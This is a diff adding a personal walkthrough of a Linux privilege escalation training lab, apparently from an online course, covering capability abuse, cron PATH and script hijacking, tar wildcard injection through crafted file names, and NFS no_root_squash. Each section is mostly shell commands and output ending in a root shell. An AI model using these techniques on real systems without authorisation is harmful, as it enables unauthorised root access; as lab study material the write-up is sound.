@@ -356,3 +356,209 @@ Cool.
 Command to identify - 
 
 getcap -r / 2>/dev/null
+
+/usr/bin/python2.6 = cap_setuid+ep
+
+Then we can check whether we can get root access using python2.6
+
+We can use python here.
+
+TCM@debian:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash") ;'
+root@debian:~# id
+uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+root@debian:~# 
+
+Noice :)
+
+12) Crontab - 1
+
+
+TCM@debian:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+TCM@debian:~$ pwd
+/home/user
+As you can see the specific path for the file overwrite.sh is not mentioned.
+So look at the path variable,the first path = /home/user
+
+SO we can write malicious script to /home/user and wait for the cron job to be completed.
+
+TCM@debian:~$ chmod 777 overwrite.sh
+TCM@debian:~$ ls -la overwrite.sh 
+-rwxrwxrwx 1 TCM user 58 Oct 12 11:03 overwrite.sh
+TCM@debian:~$ 
+
+
+TCM@debian:~$ nano overwrite.sh
+
+#!/bin/bash
+cp /bin/bash /tmp/bash ; chmod u+s /tmp/bash 
+
+
+And now wait for some time.
+Ahh we got it..
+TCM@debian:~$ cd /tmp
+TCM@debian:/tmp$ ls
+backup.tar.gz  bash  useless
+TCM@debian:/tmp$ ls -la bash
+-rwsr-xr-x 1 root root 926536 Oct 12 11:07 bash
+TCM@debian:/tmp$ 
+
+
+TCM@debian:/tmp$ ./bash -p
+bash-4.1# id
+uid=1000(TCM) gid=1000(user) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+bash-4.1# 
+
+
+
+13) Crontab -2 
+
+TCM@debian:/usr/local/bin$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+TCM@debian:/usr/local/bin$ 
+
+TCM@debian:/usr/local/bin$ cd /usr/local/bin/
+TCM@debian:/usr/local/bin$ cat compress.sh 
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+TCM@debian:/usr/local/bin$ 
+As you can see its using a wildcard.
+
+We can write malicious script.
+
+TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' > malicious.sh 
+TCM@debian:~$ cat malicious.sh 
+cp /bin/bash /tmp/bash; chmod u+s /tmp/bash
+
+TCM@debian:~$ touch /home/user/--checkpoint=1
+TCM@debian:~$ touch /home/user/--checkpoint-action=exec=sh\malicious.sh
+
+Now we will wait for the cron job to do its work.
+
+TCM@debian:/tmp$ ls -la bash
+-rwsr-xr-x 1 root root 926536 Oct 12 11:22 bash
+TCM@debian:/tmp$ ./bash -p
+bash-4.1# id
+uid=1000(TCM) gid=1000(user) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+
+
+14) Crontab -3 Overwriting existing files for privilege escalation.
+
+TCM@debian:/usr/local/bin$ echo 'cp /bin/bash /tmp/newbash; chmod u+s /tmp/newbash' > overwrite.sh
+TCM@debian:/usr/local/bin$ cat overwrite.sh 
+cp /bin/bash /tmp/newbash; chmod u+s /tmp/newbash
+TCM@debian:/usr/local/bin$ Wait for 1 min
+
+TCM@debian:/tmp$ ls -la newbash
+-rwsr-xr-x 1 root root 926536 Oct 12 11:31 newbash
+
+TCM@debian:/tmp$ ./newbash -p
+newbash-4.1# id
+uid=1000(TCM) gid=1000(user) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+
+15) NFS Root Squash
+
+TCM@debian:/tmp$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+#/tmp *(rw,sync,insecure,no_subtree_check)
+
+TCM@debian:/tmp$ 
+
+root@LAPTOP-U5913CMD:/home/akshay# showmount -e 10.10.191.114 
+Export list for 10.10.191.114:
+/tmp *
+
+root@LAPTOP-U5913CMD:/tmp/mountme# mkdir /tmp/mountme
+
+root@LAPTOP-U5913CMD:/tmp/mountme# mount -o rw,vers=2 10.10.191.114:/tmp /tmp/mountme -o nolock
+
+
+root@LAPTOP-U5913CMD:/tmp/mountme# echo 'int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/gg.c
+root@LAPTOP-U5913CMD:/tmp/mountme# cat /tmp/mountme/gg.c   
+int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }
+root@LAPTOP-U5913CMD:/tmp/mountme# gcc -o gg gg.c 
+gg.c: In function 'main':
+gg.c:1:13: warning: implicit declaration of function 'setgid' [-Wimplicit-function-declaration]
+    1 | int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }
+      |             ^~~~~~
+gg.c:1:24: warning: implicit declaration of function 'setuid' [-Wimplicit-function-declaration]
+    1 | int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }
+      |                        ^~~~~~
+gg.c:1:35: warning: implicit declaration of function 'system' [-Wimplicit-function-declaration]
+    1 | int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }
+      |                                   ^~~~~~
+root@LAPTOP-U5913CMD:/tmp/mountme# chmod u+s gg
+root@LAPTOP-U5913CMD:/tmp/mountme# 
+
+
+Now go into the victim's machine and go into the tmp folder.
+
+TCM@debian:~$ cd /tmp
+TCM@debian:/tmp$ ls -la
+total 220
+drwxrwxrwt  2 root root   4096 Oct 12 12:05 .
+drwxr-xr-x 22 root root   4096 Jun 17 23:20 ..
+-rw-r--r--  1 root root 181517 Oct 12 12:05 backup.tar.gz
+-rwsr-xr-x  1 root root  16704 Oct 12 12:03 gg
+-rw-r--r--  1 root root     67 Oct 12 12:03 gg.c
+-rw-r--r--  1 root root     29 Oct 12 12:05 useless
+TCM@debian:/tmp$ ls -la gg
+-rwsr-xr-x 1 root root 16704 Oct 12 12:03 gg
+TCM@debian:/tmp$ ./gg
+root@debian:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+root@debian:/tmp# 
+
+And we are done.
+
+It was a great course for a beginner to carry on with escalation.
+I really recommend you to checkout this course on udemy.
+
+Thank you... Happy Hacking :)
